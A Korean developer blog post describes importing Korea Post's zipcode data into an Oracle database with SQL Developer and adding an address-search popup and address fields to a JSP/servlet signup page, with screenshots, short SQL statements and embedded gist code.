<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4g7ISc67KEIDog7KO87IaM7LC-6riwIOyalOyyrVxu7ISc67KEIC0-PiBEQiDshJzrsoQgOiDso7zshozrpbwg7J207Jqp7ZWY7JesIOyasO2OuOuyiO2YuCwg7KO87IaMIOyalOyyrVxuREIg7ISc67KELT4-IOyEnOuyhCA6IOyasO2OuOuyiO2YuCwg7KO87IaMIOydkeuLtVxu7ISc67KEIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOyasO2OuOuyiO2YuCwg7KO87IaMIOydkeuLtSIsIm1lcm1haWQiOm51bGx9" /></p>

<h2 id="우편번호-db--다운받기">우편번호 DB  다운받기</h2>
<ul>
  <li><a href="https://www.epost.go.kr/search/zipcode/cmzcd002k01.jsp">우편번호 DB와 검색기</a>에서 다운받는다.</li>
  <li>압축 파일안에는 text 파일들이 들어있다.</li>
  <li><code class="language-plaintext highlighter-rouge">|</code> 의 구분자로 데이터들이 분리되어 있다.</li>
  <li>UTF-8 (BOM) 형태로 포맷 되어있다. 포맷을 UTF-8 로 변경하자.</li>
  <li>우리는 여기서 대구광역시, 경기도 파일을 oracle db 에 Import 할 것이다.</li>
</ul>

<h2 id="sql-developer-231-다운로드">SQL Developer 23.1 다운로드</h2>
<ul>
  <li>Oracle db 서버와 연결하여 보다 쉽게 sql 문들을 사용하기 위한것 이다.</li>
  <li><a href="https://www.oracle.com/database/sqldeveloper/technologies/download/">Oracle SQL Developer Downloads</a></li>
</ul>

<h3 id="오라클-서버와-연결하기">오라클 서버와 연결하기</h3>
<ol>
  <li><strong>Oracle SQL Development</strong> 를 연다.</li>
  <li><code class="language-plaintext highlighter-rouge">Oracle 접속</code> 우클릭 &gt; 새 접속<br /><img src="https://user-images.githubusercontent.com/31990118/234529534-04d39ca0-e749-4e62-9d23-5de70888c85c.png" alt="Pasted image 20230421225802" /></li>
  <li>사용자 이름, 비밀번호, db 서버 호스트 이름을 입력후 테스트를 클릭하여 접속 테스를 한다.</li>
  <li>테스트가 성공하였다면 접속 버튼을 눌러 접속해준다.<br /><img src="https://user-images.githubusercontent.com/31990118/234529679-37b86579-4e45-4e05-9d0d-ba5eb75afdb9.png" alt="Pasted image 20230421225917" /></li>
</ol>

<h3 id="오라클-db에-주소-text-데이터-import-하기">오라클 db에 주소 text 데이터 Import 하기</h3>
<ol>
  <li>테이블 우클릭한다.<br /><img src="https://user-images.githubusercontent.com/31990118/234529812-a7e707be-ebe9-4e12-95b0-184bb31c3f8a.png" alt="Pasted image 20230421230129" /></li>
  <li>데이터 임포트를 클릭한다.<br /><img src="https://user-images.githubusercontent.com/31990118/234529931-49af9420-b874-4bcb-bc56-cb7e4f59c0ac.png" alt="Pasted image 20230421230214" /></li>
  <li>위에서 다운받은 우편번호 db 파일중 하나의 파일을 선택한다. 이때 파일을 <code class="language-plaintext highlighter-rouge">UTF-8</code> 로 포맷되어 있어야 한다.</li>
  <li>다음을 눌러주어 데이터를 임포트해준다. 이 과정에서 처음으로 주소 데이터를 임포트를 한다면 주소 테이블 이름을 정해줘야 한다. 여기서는 테이블 이름을 ‘ko_address’ 라 정해주었다.</li>
  <li>다음 sql 명령을 통해 확인해 보면 내용이 잘 출력되는 것을 알 수 있다.
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span>
<span class="k">from</span> <span class="n">ko_address</span>
<span class="k">where</span> <span class="err">시도</span> <span class="k">like</span> <span class="s1">'%도%'</span><span class="p">;</span>
</code></pre></div>    </div>
    <p><img src="https://user-images.githubusercontent.com/31990118/234530306-b01fb64c-727f-4b37-8d0e-367b37593610.png" alt="Pasted image 20230421230552" /></p>
  </li>
  <li>다른 데이터를 import 할 때는 <code class="language-plaintext highlighter-rouge">ko_address</code>테이블로 데이터를 넣어 주면 된다.</li>
</ol>

<h2 id="ui-부분">UI 부분</h2>
<ul>
  <li>회원가입 페이지에 주소찾기 버튼을 추가하였다.<br /><img src="https://user-images.githubusercontent.com/31990118/234531123-6b2ecb7b-9090-4d73-90bb-8f202aff4817.png" alt="Pasted image 20230426152657" /></li>
  <li>주소찾기 버튼을 누르면 주소 찾기 창이 열린다.<br /><img src="https://user-images.githubusercontent.com/31990118/234531218-a874417b-80be-4f3c-8149-aea64c48eede.png" alt="Pasted image 20230426152712" /></li>
  <li>주소를 입력하고 검색버튼을 클릭하면 서버로 입력한 주소를 요청으로 보내고 응답결과인 우편번호와 주소들을 화면에 보여준다.<br /><img src="https://user-images.githubusercontent.com/31990118/234531305-fe304efe-30db-4feb-936f-92df58f369d0.png" alt="Pasted image 20230426163522" /></li>
  <li>주소를 클릭하여 주면 우편번호와 주소가 회원가입 페이지의 주소 부분에 들어가게 된다.<br /><img src="https://user-images.githubusercontent.com/31990118/234531391-8fab6c8f-9922-446a-a0c8-3957e0631dc5.png" alt="Pasted image 20230426154811" /></li>
</ul>

<h3 id="코드">코드</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sign_up_page.jsp</code> 에 주소검색을 위한 코드를 추가하였다.<br /><script src="https://gist.github.com/MinGyu2/94743489626663324bf55bc9a944782b.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">/sign_in_page/sign_up_page/find_address_number?address=주소</code> 형태로 서버로 get요청을 보낸다.</li>
  <li>
    <p>서버로부터 응답을 받으면 <code class="language-plaintext highlighter-rouge">\n</code> 로 분리하여 table에 넣어 사용자에게 보여준다.<br /><script src="https://gist.github.com/MinGyu2/6f1c5edd8a3efc93ae0d349e245c605c.js"></script></p>
  </li>
  <li>주소검색창 UI 부분.<br /><script src="https://gist.github.com/MinGyu2/e95aa28a4aded72d65d68c959478611f.js"></script></li>
</ul>

<p><br /><br /></p>

<h2 id="서버부분---db-서버-">서버부분 ( + DB 서버 )</h2>
<ul>
  <li>서버에서 유저가 입력한 주소를 받아 주소에 해당하는 우편번호와 주소를 DB에서 찾아 응답으로 보낸다.</li>
</ul>

<h3 id="코드-1">코드</h3>

<h4 id="dbconnection-class-추가">DBConnection Class 추가</h4>
<ul>
  <li>DB 서버와 연결하기전 사전 준비를 하기위한 클래스이다.</li>
  <li>DBConnection의 <strong>connectDB</strong> 함수를 통해 DB 서버와 연결한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/6e74fe516a6df3691df95462f14a2caa.js"></script>

<h4 id="addressdao-class-추가">AddressDAO Class 추가</h4>
<ul>
  <li>DB의 <code class="language-plaintext highlighter-rouge">KO_ADDRESS</code> 테이블에 접근하여 우편번호와 주소를 읽어오기위한 클래스이다.</li>
  <li><strong>getAddressNumber</strong> 함수는 사용자가 입력한 주소를 이용하여 우편번호와 주소를 찾는다. 그리고 우편주소와 주소를 하나의 String으로 만들어 리턴한다.</li>
  <li><strong>getAddressNumber</strong> 함수에서는 테이블에서 최대 50개 까지의 우편번호와 주소를 찾아 리턴할 수 있다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/0e0ff6366b722575bdfae1214607bd40.js"></script>

<h4 id="login-클래스에-우편번호-uri-부분-추가하기">Login 클래스에 우편번호 uri 부분 추가하기.</h4>
<ul>
  <li>사용자가 주소를 입력하고 서버로부터 우편주소와 주소를 받기위해 get 요청을 한다.</li>
  <li>서버는 <code class="language-plaintext highlighter-rouge">/sign_in_page/sign_up_page/find_address_number</code> uri로 get 요청을 받는다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/18f3a30443c3ef0f67a9d426f05919ba.js"></script>

<h2 id="회원-가입-할-때-우편번호-및-주소를-추가로-db에-저장하기">회원 가입 할 때 우편번호 및 주소를 추가로 db에 저장하기</h2>
<h3 id="사전-준비">사전 준비</h3>
<ul>
  <li>먼저 우편번호와 주소를 저장하기 위한 컬럼을 만들어줘야 한다.
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">alter</span> <span class="k">table</span> <span class="n">users</span> <span class="k">add</span> <span class="err">우편번호</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">25</span><span class="p">)</span> <span class="k">default</span> <span class="s1">'12428'</span> <span class="k">not</span> <span class="k">null</span><span class="p">;</span>
<span class="k">alter</span> <span class="k">table</span> <span class="n">users</span> <span class="k">add</span> <span class="err">주소</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="k">default</span> <span class="s1">'경기도 가평군 북한강변로 326-138'</span> <span class="k">not</span> <span class="k">null</span><span class="p">;</span>
<span class="k">alter</span> <span class="k">table</span> <span class="n">users</span> <span class="k">add</span> <span class="err">주소</span><span class="mi">2</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="k">default</span> <span class="s1">' '</span> <span class="k">not</span> <span class="k">null</span><span class="p">;</span>
</code></pre></div>    </div>
  </li>
  <li>현재 <code class="language-plaintext highlighter-rouge">USERS</code> 테이블의 컬럼.<br /><img src="https://user-images.githubusercontent.com/31990118/234541935-94eeae91-cce3-4fa2-a686-0220c42f3fe8.png" alt="Pasted image 20230426165757" /></li>
  <li>회원가입할 때 우편번호와 주소를 필요로 한다.</li>
</ul>

<h3 id="클라이언트-수정-부분">클라이언트 수정 부분</h3>

<h4 id="sign_up_pagejsp-부분-수정">sign_up_page.jsp 부분 수정</h4>
<ul>
  <li>회원가입을 하기위하여 우편번호, 주소를 추가하여 서버로 post 요청을 보낸다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/1c924566aa82beaaa656739e56e2e993.js"></script>

<h3 id="서버-수정-부분">서버 수정 부분</h3>

<h4 id="login-class-의-회원가입-부분-수정">Login class 의 회원가입 부분 수정</h4>
<ul>
  <li>사용자로부터 address_number, address1, address2를 추가적으로 post 요청 받는다.</li>
  <li><strong>SignUp.createUser</strong> 함수의 인자로 주어 회원가입을 진행한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/3d75cdc317274ea780a2fccb9d74f1a8.js"></script>

<h4 id="singup-부분-수정">SingUp 부분 수정</h4>
<ul>
  <li>우편번호와 주소 부분을 추가로 받는다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/f87fa4e9bebf0e81cb2188234ea98c1d.js"></script>

<h4 id="userdao-createuser-함수-부분-수정">UserDAO createUser 함수 부분 수정</h4>
<ul>
  <li>유저 정보 테이블에 주소를 저장하는 부분을 추가한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/245cb5a0fbc2d20c5a01dedbea471b9e.js"></script>

<h3 id="동작화면">동작화면</h3>
<ol>
  <li>회원가입 페이지에서 정보를 입력한다.<br /><img src="https://user-images.githubusercontent.com/31990118/234544104-b12395fb-0da9-472b-a1db-2538c8163165.png" alt="Pasted image 20230426172840" /></li>
  <li>주소찾기 버튼을 누르명 주소찾기창이 나온다. 이 창에서 주소를 입력하고 검색 버튼을 눌러준다. <br /><img src="https://user-images.githubusercontent.com/31990118/234544163-bff55a86-4bf3-4599-9136-e46583e8d853.png" alt="Pasted image 20230426173129" /></li>
  <li>맞는 주소를 클릭하면 회원가입의 주소창에 우편번호와 주소가 들어간다.<br /><img src="https://user-images.githubusercontent.com/31990118/234544217-fb54c52f-cf29-4195-9042-be7be09f0edc.png" alt="Pasted image 20230426173238" /></li>
  <li>회원가입 버튼을 클릭하여 준다.<br /><img src="https://user-images.githubusercontent.com/31990118/234544275-5a680719-969e-4a1e-87cb-d2806d207b41.png" alt="Pasted image 20230426173314" /></li>
  <li>새로 생성한 계정으로 로그인해보기.<br /><img src="https://user-images.githubusercontent.com/31990118/234544328-b337f9e6-38eb-4d36-8a72-cd7c1f799214.png" alt="Pasted image 20230426173707" /><br /><img src="https://user-images.githubusercontent.com/31990118/234544361-f2ce717c-fb36-4aca-9a80-03c5afe76445.png" alt="Pasted image 20230426173726" /></li>
  <li><code class="language-plaintext highlighter-rouge">USERS</code> 테이블에 user4 유저 생성됬는지 확인하기.<br /><img src="https://user-images.githubusercontent.com/31990118/234544415-0900aba6-29eb-4dbe-b841-bfb7fe7262ba.png" alt="Pasted image 20230426173901" /></li>
</ol>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://accessgudid.nlm.nih.gov/resources/developers/importing_delimited_device_files/oracle">Importing Delimited Device Files into an Oracle Database using Oracle SQL Developer</a></li>
  <li><a href="https://deveric.tistory.com/68">주소 데이터의 빠른 조회를 위해 인덱스 설정하기 (tistory.com)</a></li>
  <li><a href="https://www.codingfactory.net/10424">JavaScript / Object / String.split() / 문자열 분할하는 메서드 – CODING FACTORY</a></li>
  <li><a href="https://hogni.tistory.com/122">자바스크립트 childNodes 속성과 children 속성의 차이 (tistory.com)</a></li>
  <li><a href="https://ggmouse.tistory.com/417">JavaScript this 인자 전달 onclick/href (tistory.com)</a></li>
  <li><a href="https://www.w3schools.com/howto/tryit.asp?filename=tryhow_css_login_form_modal">W3Schools Tryit Editor</a></li>
  <li><a href="https://www.epost.go.kr/search.RetrieveIntegrationNewZipCdList.comm">우편번호검색 - 통합검색 우편번호 (epost.go.kr)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="웹서버" /><category term="servlet" /><category term="jsp" /><summary type="html"><![CDATA[주소검색 기능을 만들어보자.]]></summary></entry></feed>